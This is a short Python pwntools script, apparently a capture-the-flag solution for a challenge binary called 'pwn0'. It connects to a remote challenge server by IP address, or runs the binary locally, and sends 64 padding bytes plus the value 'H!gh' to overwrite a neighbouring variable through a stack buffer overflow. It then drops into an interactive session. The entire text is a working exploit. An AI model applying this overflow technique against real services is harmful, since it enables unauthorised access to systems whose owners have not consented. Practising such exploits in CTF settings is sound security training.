from pwn import *
def connect(server=1):
	if server:
		try:
			return remote("104.154.106.182","1234")
		except:
			print "[-] The server is down : (Try offline) `con = connect(0)` on line 12"
	else:
		return process("./pwn0")

val = "H!gh"
con = connect()

padding = "A"*64
payload = padding + val

con.sendline(payload)
con.interactive()